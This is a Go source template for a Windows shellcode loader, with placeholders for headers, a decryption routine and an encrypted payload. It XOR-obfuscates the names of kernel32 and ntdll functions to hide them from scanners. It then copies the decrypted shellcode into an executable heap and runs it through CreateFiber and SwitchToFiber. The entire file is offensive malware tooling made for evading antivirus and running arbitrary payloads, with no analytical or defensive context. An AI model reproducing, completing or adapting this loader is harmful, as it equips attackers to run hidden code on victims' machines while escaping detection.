package main

import (
     "unsafe"
     "syscall"
     {{header}}
)

{{decryption}}

func XOR(shellcode []byte,key byte)[]byte{
     for i:=0;i< len(shellcode);i++{
      shellcode[i] ^= key
     }
     return shellcode
}

func Loader(buf []byte){
     var kernel32  = syscall.NewLazyDLL(string(XOR([]byte{68,106,125,97,106,99,60,61,33,107,99,99},15)))
     var ntdll = syscall.NewLazyDLL(string(XOR([]byte{80 ,106 ,90, 114, 114, 48, 122, 114, 114},30)))
     var ConFiber = kernel32.NewProc(string(XOR([]byte{87, 123 ,122 ,98 ,113 ,102 ,96 ,64 ,124 ,102 ,113 ,117, 112 ,64 ,123, 82, 125 ,118 ,113 ,102},20)))
     var HeapCr = kernel32.NewProc(string(XOR([]byte{107, 70, 66, 83, 96 ,81 ,70, 66, 87, 70},35)))
     var HeapAl = kernel32.NewProc(string(XOR([]byte{96 ,77 ,73 ,88 ,105 ,68 ,68 ,71 ,75},40)))
     var CrFiber = kernel32.NewProc(string(XOR([]byte{127 ,78, 89, 93, 72, 89, 122, 85, 94, 89, 78},60)))
     var SwitchFiber = kernel32.NewProc(string(XOR([]byte{111 ,75, 85, 72, 95, 84, 104, 83, 122, 85 ,94 ,89, 78},60)))
     var RtlCopy = ntdll.NewProc(string(XOR([]byte{16 ,54 ,46 ,1 ,45 ,50 ,59 ,15 ,39 ,47 ,45 ,48 ,59},66)))


     ConFiber.Call(uintptr(0))
     heap,_,_ := HeapCr.Call(uintptr(0x00040000),0,0)
     heapMemory,_,_ := HeapAl.Call(heap,0,uintptr(len(buf)))
     RtlCopy.Call(heapMemory,uintptr(unsafe.Pointer(&buf[0])),uintptr(len(buf)))
     fiber,_,_ := CrFiber.Call(0,heapMemory,0)
     SwitchFiber.Call(fiber)
}

func main(){
     shellcode := Crypto("{{shellcode}}")
     Loader(shellcode)
}